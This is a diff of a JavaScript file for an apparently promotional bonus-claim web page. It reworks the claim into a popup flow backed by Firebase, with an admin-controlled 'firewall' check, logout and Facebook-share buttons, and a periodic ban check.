@@ -1,6 +1,6 @@
 /**
  * PlayBonus.js - Main Script for PlayBonus.html
- * Handles: User data, Timer, Ticker, Confetti, PT Cat Claim, Firebase Tracking
+ * Flow: Lucky Cat Hero → CLAIM NOW → Popup → CLAIM BONUS → Add to Balance
  */
 
 (function() {
@@ -75,15 +75,14 @@
         loadUserData();
         initTimer();
         initTicker();
-        initPTCCatClaim();
+        initClaimFlow();
         initConfetti();
-        
-        // Initialize other modules
-        if (window.ChatWidget) window.ChatWidget.init();
+        attachButtonEvents();
         
         console.log('✅ All systems ready!');
     }
     
+    // ========== INIT FIREBASE ==========
     function initFirebase() {
         if (typeof firebaseConfig === 'undefined') {
             console.error('Firebase config not found!');
@@ -209,7 +208,20 @@
         requestAnimationFrame(step);
     }
     
-    // ========== TRACK CLAIM IN FIREBASE ==========
+    // ========== CHECK FIREWALL BEFORE CLAIM ==========
+    function checkFirewallBeforeClaim() {
+        try {
+            return db.ref('admin/globalFirewall').once('value').then(function(snapshot) {
+                var data = snapshot.val();
+                return (data && data.active === true);
+            });
+        } catch(e) {
+            console.error('Firewall check error:', e);
+            return Promise.resolve(false);
+        }
+    }
+    
+    // ========== TRACK CLAIM IN FIREBASE (for index.html graph) ==========
     function trackClaimInFirebase(amount) {
         try {
             var now = new Date();
@@ -241,53 +253,68 @@
         }
     }
     
-    // ========== TRACK REDEMPTION IN FIREBASE ==========
-    function trackRedemptionInFirebase(amount) {
-        try {
-            var now = new Date();
-            var year = now.getFullYear();
-            var month = String(now.getMonth() + 1).padStart(2, '0');
-            var day = String(now.getDate()).padStart(2, '0');
-            var dateKey = year + '-' + month + '-' + day;
-            
-            var dayRef = db.ref('festival_stats/daily/' + dateKey);
-            
-            dayRef.transaction(function(data) {
-                if (data === null) {
-                    data = {
-                        claims_count: 0,
-                        claims_amount: 0,
-                        redemption_count: 0,
-                        redemption_amount: 0
-                    };
-                }
-                data.redemption_count = (data.redemption_count || 0) + 1;
-                data.redemption_amount = (data.redemption_amount || 0) + (amount || 0);
-                data.last_update = Date.now();
-                return data;
-            });
-            
-            console.log('📊 Redemption tracked:', dateKey, '₱' + amount);
-        } catch(e) {
-            console.error('Track redemption error:', e);
-        }
-    }
-    
-    // ========== PT CAT CLAIM ==========
-    function initPTCCatClaim() {
-        var claimBtn = document.getElementById('ptCatClaimBtn');
+    // ========== INIT CLAIM FLOW (Popup based) ==========
+    function initClaimFlow() {
+        console.log('🎁 Initializing Claim Flow...');
         
-        if (!claimBtn) {
-            console.log('⚠️ PT Cat claim button not found');
+        var claimNowBtn = document.getElementById('claimNowBtn');
+        var popup = document.getElementById('bonusRewardPopup');
+        
+        if (!claimNowBtn) {
+            console.log('⚠️ Claim Now button not found');
             return;
         }
         
-        claimBtn.addEventListener('click', handlePTCCatClaim);
-        updatePTCCatUI();
+        // ========== CLAIM NOW BUTTON → OPENS POPUP ==========
+        claimNowBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            
+            console.log('🖱️ CLAIM NOW clicked');
+            
+            // Play sound
+            playSound('scatter');
+            
+            // Check if already claimed
+            if (isClaimed) {
+                alert("You have already claimed this bonus!");
+                return;
+            }
+            
+            // Show popup
+            if (popup) {
+                popup.style.display = 'flex';
+                console.log('✅ Popup opened');
+            }
+        });
         
-        console.log('✅ PT Cat Claim initialized');
+        // ========== CLAIM BONUS BUTTON (Inside Popup) ==========
+        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
+        if (ptCatClaimBtn) {
+            ptCatClaimBtn.addEventListener('click', handlePTCCatClaim);
+        }
+        
+        // ========== POPUP CLOSE BUTTON ==========
+        var closeBtn = document.getElementById('bonusRewardClose');
+        if (closeBtn) {
+            closeBtn.addEventListener('click', function() {
+                if (popup) popup.style.display = 'none';
+            });
+        }
+        
+        // ========== POPUP BACK BUTTON ==========
+        var backBtn = document.getElementById('bonusRewardBack');
+        if (backBtn) {
+            backBtn.addEventListener('click', function() {
+                if (popup) popup.style.display = 'none';
+            });
+        }
+        
+        updatePTCCatUI();
+        console.log('✅ Claim Flow initialized');
     }
     
+    // ========== HANDLE CLAIM BONUS (Inside Popup) ==========
     function handlePTCCatClaim(e) {
         e.preventDefault();
         e.stopPropagation();
@@ -324,30 +351,69 @@
         });
     }
     
-    async function processPTCCatClaim() {
+    // ========== PROCESS CLAIM ==========
+    function processPTCCatClaim() {
         claimInProgress = true;
         
-        var claimBtn = document.getElementById('ptCatClaimBtn');
+        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
+        var popup = document.getElementById('bonusRewardPopup');
         
-        if (claimBtn) {
-            claimBtn.disabled = true;
-            claimBtn.style.opacity = '0.6';
-            claimBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>PROCESSING...</span>';
+        if (ptCatClaimBtn) {
+            ptCatClaimBtn.disabled = true;
+            ptCatClaimBtn.style.opacity = '0.6';
+            ptCatClaimBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>PROCESSING...</span>';
         }
         
-        try {
-            // Save claim to Firebase
-            await userRef.update({ 
-                claimed_ptcat: true, 
-                ptcat_claimed_at: Date.now() 
-            });
-            console.log('✅ PT Cat claimed saved to Firebase');
+        // Check firewall first
+        checkFirewallBeforeClaim().then(function(firewallOn) {
+            if (firewallOn) {
+                console.log('🔥 Firewall ON - Showing AI Verification');
+                
+                // Hide bonus popup
+                if (popup) popup.style.display = 'none';
+                
+                // Show AI Verification popup
+                if (window.showPopup) {
+                    window.showPopup(currentBalance);
+                }
+                
+                claimInProgress = false;
+                
+                // Reset claim button
+                if (ptCatClaimBtn) {
+                    ptCatClaimBtn.disabled = false;
+                    ptCatClaimBtn.style.opacity = '1';
+                    ptCatClaimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
+                }
+                return;
+            }
             
-            // Track claim in daily stats
+            // No firewall - proceed with claim
+            proceedWithClaim();
+        }).catch(function(error) {
+            console.error('Firewall check error:', error);
+            proceedWithClaim();
+        });
+    }
+    
+    // ========== PROCEED WITH CLAIM ==========
+    function proceedWithClaim() {
+        var userPhone = localStorage.getItem("userPhone") || "Unknown";
+        
+        // Save claim to Firebase
+        userRef.update({ 
+            claimed_ptcat: true, 
+            ptcat_claimed_at: Date.now() 
+        }).then(function() {
+            console.log('✅ Claim saved to Firebase');
+            
+            // Track claim in daily stats (for index.html graph)
             trackClaimInFirebase(bonusAmount);
             
-            // Play sound + add balance
+            // Play sound
             playSound('claim');
+            
+            // Add to balance with animation
             addToBalance(bonusAmount, true);
             
             // Confetti
@@ -357,42 +423,50 @@
             isClaimed = true;
             updatePTCCatUI();
             
-            // Show success popup
-            showSuccessPopup(bonusAmount);
+            // Hide popup
+            var popup = document.getElementById('bonusRewardPopup');
+            if (popup) popup.style.display = 'none';
+            
+            // Show success popup after short delay
+            setTimeout(function() {
+                showSuccessPopup(bonusAmount);
+            }, 500);
             
             setTimeout(function() { 
                 claimInProgress = false; 
             }, 2500);
             
-        } catch(e) {
+        }).catch(function(e) {
             console.error('Firebase save error:', e);
             alert('Error saving claim. Please try again.');
             
-            if (claimBtn) {
-                claimBtn.disabled = false;
-                claimBtn.style.opacity = '1';
-                claimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
+            var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
+            if (ptCatClaimBtn) {
+                ptCatClaimBtn.disabled = false;
+                ptCatClaimBtn.style.opacity = '1';
+                ptCatClaimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
             }
             claimInProgress = false;
-        }
+        });
     }
     
+    // ========== UPDATE UI ==========
     function updatePTCCatUI() {
-        var claimBtn = document.getElementById('ptCatClaimBtn');
+        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
         
-        if (claimBtn) {
+        if (ptCatClaimBtn) {
             if (isClaimed) {
-                claimBtn.disabled = true;
-                claimBtn.style.opacity = '0.5';
-                claimBtn.style.cursor = 'not-allowed';
-                claimBtn.innerHTML = '<i class="fas fa-check-circle"></i> <span>ALREADY CLAIMED</span>';
-                claimBtn.classList.add('claimed');
+                ptCatClaimBtn.disabled = true;
+                ptCatClaimBtn.style.opacity = '0.5';
+                ptCatClaimBtn.style.cursor = 'not-allowed';
+                ptCatClaimBtn.innerHTML = '<i class="fas fa-check-circle"></i> <span>ALREADY CLAIMED</span>';
+                ptCatClaimBtn.classList.add('claimed');
             } else {
-                claimBtn.disabled = false;
-                claimBtn.style.opacity = '1';
-                claimBtn.style.cursor = 'pointer';
-                claimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
-                claimBtn.classList.remove('claimed');
+                ptCatClaimBtn.disabled = false;
+                ptCatClaimBtn.style.opacity = '1';
+                ptCatClaimBtn.style.cursor = 'pointer';
+                ptCatClaimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
+                ptCatClaimBtn.classList.remove('claimed');
             }
         }
     }
@@ -405,6 +479,9 @@
         
         if (amountEl) amountEl.textContent = amount;
         if (popup) popup.style.display = 'flex';
+        
+        // Play success sound
+        playSound('success');
         
         if (closeBtn) {
             closeBtn.onclick = function() {
@@ -512,27 +589,28 @@
     }
     
     // ========== CONFETTI ==========
+    var confettiCanvas = null;
+    var confettiAnimation = null;
+    
     function initConfetti() {
-        window.confettiCanvas = document.getElementById('confettiCanvas');
+        confettiCanvas = document.getElementById('confettiCanvas');
     }
     
     function startConfetti() {
-        var canvas = window.confettiCanvas;
-        if (!canvas) return;
+        if (!confettiCanvas) return;
         
-        canvas.style.display = 'block';
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
+        confettiCanvas.style.display = 'block';
+        confettiCanvas.width = window.innerWidth;
+        confettiCanvas.height = window.innerHeight;
         
-        var ctx = canvas.getContext('2d');
+        var ctx = confettiCanvas.getContext('2d');
         var particles = [];
-        var animation = null;
         var timeout = null;
         
         for (var i = 0; i < 150; i++) {
             particles.push({
-                x: Math.random() * canvas.width,
-                y: Math.random() * canvas.height - canvas.height,
+                x: Math.random() * confettiCanvas.width,
+                y: Math.random() * confettiCanvas.height - confettiCanvas.height,
                 size: Math.random() * 8 + 3,
                 color: 'hsl(' + (Math.random() * 360) + ', 100%, 60%)',
                 speed: Math.random() * 4 + 2,
@@ -542,8 +620,8 @@
         }
         
         function draw() {
-            if (!canvas || canvas.style.display === 'none') return;
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            if (!confettiCanvas || confettiCanvas.style.display === 'none') return;
+            ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
             
             for (var i = 0; i < particles.length; i++) {
                 var p = particles[i];
@@ -557,21 +635,78 @@
                 p.y += p.speed;
                 p.rotation += p.rotationSpeed;
                 
-                if (p.y > canvas.height) {
+                if (p.y > confettiCanvas.height) {
                     p.y = -p.size;
-                    p.x = Math.random() * canvas.width;
+                    p.x = Math.random() * confettiCanvas.width;
                 }
             }
-            animation = requestAnimationFrame(draw);
+            confettiAnimation = requestAnimationFrame(draw);
         }
         
         draw();
         
         timeout = setTimeout(function() {
-            if (animation) cancelAnimationFrame(animation);
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            canvas.style.display = 'none';
+            if (confettiAnimation) cancelAnimationFrame(confettiAnimation);
+            ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
+            confettiCanvas.style.display = 'none';
         }, 4000);
+    }
+    
+    // ========== ATTACH BUTTON EVENTS ==========
+    function attachButtonEvents() {
+        // Logout button
+        var logoutBtn = document.getElementById('logoutBtn');
+        if (logoutBtn) {
+            logoutBtn.addEventListener('click', function() {
+                logoutUser();
+            });
+        }
+        
+        // Facebook share
+        var fbBtn = document.getElementById('facebookShareBtn');
+        if (fbBtn) {
+            fbBtn.addEventListener('click', function() {
+                shareOnFacebook();
+            });
+        }
+    }
+    
+    // ========== LOGOUT ==========
+    function logoutUser() {
+        if (userPhone) {
+            try {
+                db.ref('user_sessions/' + userPhone).update({
+                    status: 'offline',
+                    lastSeen: firebase.database.ServerValue.TIMESTAMP
+                });
+            } catch(e) { console.log('Logout error:', e); }
+        }
+        localStorage.clear();
+        sessionStorage.clear();
+        window.location.replace('index.html');
+    }
+    
+    // ========== FACEBOOK SHARE ==========
+    function shareOnFacebook() {
+        var shareUrl = 'https://tiny.cc/LuckyDrop';
+        window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl), '_blank', 'width=600,height=400');
+    }
+    
+    // ========== BAN CHECK ==========
+    function checkIfBanned() {
+        if (!userPhone) return;
+        try {
+            db.ref('banned_ghosts/' + userPhone).once('value').then(function(snap) {
+                if (snap.exists()) {
+                    db.ref('user_sessions/' + userPhone).update({ status: 'offline' });
+                    localStorage.clear();
+                    sessionStorage.clear();
+                    window.location.replace('index.html');
+                }
+            });
+        } catch(e) { 
+            console.log('Ban check error:', e); 
+        }
     }
     
     // ========== EXPORT FUNCTIONS ==========
@@ -579,15 +714,20 @@
         addToBalance: addToBalance,
         playSound: playSound,
         formatNumberWithComma: formatNumberWithComma,
-        trackClaim: trackClaimInFirebase,
-        trackRedemption: trackRedemptionInFirebase
+        trackClaim: trackClaimInFirebase
     };
     
     // ========== START ==========
     if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', init);
+        document.addEventListener('DOMContentLoaded', function() {
+            init();
+            setInterval(checkIfBanned, 5000);
+            checkIfBanned();
+        });
     } else {
         init();
+        setInterval(checkIfBanned, 5000);
+        checkIfBanned();
     }
     
 })();
